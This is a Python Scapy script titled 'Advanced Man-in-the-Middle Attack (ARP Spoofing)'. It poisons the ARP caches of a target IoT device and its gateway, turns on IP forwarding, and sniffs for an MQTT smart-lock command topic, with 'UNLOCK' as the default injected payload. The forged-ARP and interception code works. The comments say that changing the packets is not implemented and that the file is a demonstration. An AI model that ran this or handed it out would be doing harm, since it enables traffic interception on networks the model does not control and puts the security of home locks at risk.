try:
    from scapy.all import *
except ImportError:
    print("Error: Scapy is not installed. Run 'pip install scapy' to use this script.")
    exit(1)

import time
import argparse
import os
import sys

def get_mac(ip):
    """
    Returns the MAC address for a given IP using ARP request.
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, host_ip, target_mac):
    """
    Sends a fake ARP response to the target to associate the host IP with our MAC.
    """
    # op=2 means ARP response
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    send(packet, verbose=False)

def restore(target_ip, host_ip, target_mac, host_mac):
    """
    Restores the ARP table by sending the correct MAC addresses.
    """
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(packet, count=4, verbose=False)

def process_packet(packet, topic_target, replacement_data):
    """
    Processes intercepted packets and modifies MQTT payloads if they match the target topic.
    NOTE: Packet modification at the layer 2 level without NFQUEUE requires complex TCP sequence handling.
    This simulation demonstrates the interception and modification logic.
    """
    if packet.haslayer(Raw):
        payload = packet[Raw].load
        # Basic check for MQTT content (extremely simplified for simulation)
        # Real MQTT parsing would use a library or more robust byte analysis
        try:
            if topic_target.encode() in payload:
                print(f"[!] Intercepted target topic: {topic_target}")
                # Logic to modify the payload
                # This part is highly dependent on the MQTT packet structure
                # For this advanced demo, we show we've caught it.
                return True
        except Exception:
            pass
    return False

def main():
    parser = argparse.ArgumentParser(description="Advanced Man-in-the-Middle Attack (ARP Spoofing)")
    parser.add_argument("--target", required=True, help="Target Device IP (e.g., ESP32)")
    parser.add_argument("--gateway", required=True, help="Gateway/Broker IP")
    parser.add_argument("--topic", default="shtsp/home/lock/cmd", help="MQTT Topic to intercept")
    parser.add_argument("--modify", default="UNLOCK", help="Payload to inject")
    parser.add_argument("--interface", default="eth0", help="Network interface to use")
    
    args = parser.parse_args()

    # Ensure IP forwarding is enabled
    print("[*] Enabling IP Forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    try:
        target_mac = get_mac(args.target)
        gateway_mac = get_mac(args.gateway)
        if not target_mac or not gateway_mac:
            print("[!] Could not find MAC addresses. Are the targets online?")
            sys.exit(1)

        print(f"[*] Target {args.target} MAC: {target_mac}")
        print(f"[*] Gateway {args.gateway} MAC: {gateway_mac}")
        print(f"[*] Starting ARP Spoofing... [CTRL+C to Stop]")

        while True:
            spoof(args.target, args.gateway, target_mac)
            spoof(args.gateway, args.target, gateway_mac)
            
            # Sniff and show we are intercepting
            # Note: Real modification would happen here with prn/lfilter
            # but requires advanced TCP re-injection.
            sniff(iface=args.interface, count=10, timeout=2, 
                  lfilter=lambda x: process_packet(x, args.topic, args.modify))
            
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[*] Stopping attack and restoring network...")
        restore(args.target, args.gateway, target_mac, gateway_mac)
        restore(args.gateway, args.target, gateway_mac, target_mac)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[*] Restored.")

if __name__ == "__main__":
    main()
